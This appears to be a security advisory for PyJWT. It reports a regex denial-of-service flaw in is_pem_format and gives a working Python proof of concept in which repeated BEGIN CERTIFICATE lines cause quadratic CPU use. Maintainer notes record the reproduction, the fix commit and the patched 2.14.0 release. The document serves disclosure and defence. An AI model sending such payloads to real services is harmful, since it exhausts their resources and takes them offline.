@@ -1,0 +1,72 @@
+Summary
+There is a Re-DoS vulnerability in the is_pem_format function which results in a intesive CPU usage if an attacker is been able to provide a custom certificate.
+
+Details
+The problem is that the lazy quantifier .+? will always first try to match as little as possible until it finds a ---- END. Normally this means the complexity of this should be O(N). However, by providing an input which consists only of ----BEGIN CERTIFICATE----- lines and no ---- END line, the regex algorithm will first try to match the first line and then, with the lazy quantifier, all the lines until the end O(N), which then fails since it is unable to find a ---- END line. It will then jump to the next line, resulting in N re-scans of the whole string, which means the complexity basically results in O(N²).
+
+PoC
+import time
+import re
+
+
+BEGIN_LINE = b"-----BEGIN CERTIFICATE-----\n"
+
+_PEMS = {
+    b"CERTIFICATE",
+    b"TRUSTED CERTIFICATE",
+    b"PRIVATE KEY",
+    b"PUBLIC KEY",
+    b"ENCRYPTED PRIVATE KEY",
+    b"OPENSSH PRIVATE KEY",
+    b"DSA PRIVATE KEY",
+    b"RSA PRIVATE KEY",
+    b"RSA PUBLIC KEY",
+    b"EC PRIVATE KEY",
+    b"DH PARAMETERS",
+    b"NEW CERTIFICATE REQUEST",
+    b"CERTIFICATE REQUEST",
+    b"SSH2 PUBLIC KEY",
+    b"SSH2 ENCRYPTED PRIVATE KEY",
+    b"X509 CRL",
+}
+
+_PEM_RE = re.compile(
+    b"----[- ]BEGIN ("
+    + b"|".join(_PEMS)
+    + b""")[- ]----\r?
+.+?\r?
+----[- ]END \\1[- ]----\r?\n?""",
+    re.DOTALL,
+)
+
+
+def is_pem_format(key: bytes) -> bool:
+    return bool(_PEM_RE.search(key))
+
+
+def make_payload(num_headers: int) -> bytes:
+    return BEGIN_LINE * num_headers
+
+
+def measure(num_headers: int) -> float:
+    payload = make_payload(num_headers)
+    start = time.perf_counter()
+    is_pem_format(payload)  # returns False, but burns CPU getting there
+    elapsed = time.perf_counter() - start
+    print(
+        f"  headers={num_headers:>4}  size={len(payload)//1024:>3} KB"
+        f"   time={elapsed*1000:>7.1f} ms"
+    )
+    return elapsed
+
+
+for n in (1000, 2000, 4000, 8000):
+    measure(n)
+Impact
+The attacker could use extensive resources, which could make the resource (e.g. a web server) unavailable.
+
+Maintainer update (2026-09-10):
+We reproduced the reported quadratic regex behavior on malformed PEM-like input: doubling repeated BEGIN lines produced approximately fourfold runtime growth, while equal-sized ordinary input remained negligible. The affected path is reached when an application passes attacker-controlled key or certificate bytes to PyJWT’s key preparation, and the impact is resource exhaustion. The fix is on master in commit 8b4e233a22206b34ec1186e912e75c0b2396ac07; it replaces the backtracking PEM regex with a bounded marker scan. Fresh Astra/max review accepted the fix and confirmed malformed, mixed-label, and valid-input controls. This is a distinct ReDoS finding from the later PEM-recognition report that shares the implementation commit. The fix has not yet shipped in a released PyJWT 2.x version, so this advisory is being moved to draft and remains unpublished pending release.
+
+Maintainer update — 2026-09-11
+The verified fix for this advisory is included in PyJWT 2.14.0, released on 2026-09-11 and available on PyPI. PyJWT 2.14.0 is the first release containing the fix. This advisory is now published with the release recorded as the patched version.
